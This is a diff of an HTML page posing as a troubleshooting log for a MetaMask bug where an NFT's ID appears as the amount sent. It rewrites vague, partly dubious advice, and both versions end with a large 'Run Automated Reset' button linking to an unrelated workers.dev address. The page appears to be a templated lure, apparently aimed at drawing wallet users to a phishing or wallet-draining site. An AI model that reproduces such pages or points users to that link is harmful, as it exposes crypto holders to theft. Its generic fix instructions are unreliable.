@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,35 @@
 <h1>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience a bug when sending Non-Fungible Tokens (NFTs). The activity log displays the NFT's ID as if it were the amount being sent, rather than showing the actual NFT being transferred.</li>
+<li>When attempting to send an NFT using the Metamask extension, the Activity tab displays the NFT's ID as if it were the amount being sent, instead of showing the actual NFT being transferred.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a misinterpretation of the data structure used to represent NFT transfers within the Metamask extension. Specifically, the code mistakenly pulls the NFT's ID and presents it as the quantity being sent, instead of correctly identifying and displaying the NFT itself.</li>
+<li>The error occurs due to a bug in the Metamask extension's Activity tab, where it incorrectly parses the transaction data and displays the NFT's ID as the amount.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
-<li>Check the transaction details on a blockchain explorer to verify the actual NFT being transferred.</li>
-<li>Use the Metamask debug mode to inspect the transaction payload and identify where the ID is being misinterpreted.</li>
-<li>Edit the transaction metadata using a custom JSON script:</li>
+<li>To resolve this issue, try the following manual overrides:</li>
+<li>Check the transaction details on a blockchain explorer to verify the correct NFT is being transferred.</li>
+<li>Use the Metamask API to fetch the transaction data and parse it manually:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...sender_address...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...recipient_address...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...nft_transfer_data...&quot;</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionByHash&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x...transaction_hash...&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex manipulations.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured on your browser.</li>
-<li>Basic understanding of Ethereum transactions and NFTs.</li>
-<li>Familiarity with using blockchain explorers for transaction verification.</li>
+<li>Update the Metamask extension to the latest version to ensure any bug fixes are applied.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* ETH wallet with NFTs
+* Basic understanding of blockchain transactions</p>
+<p>You may want to consider using an external console to debug and verify the transaction data.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
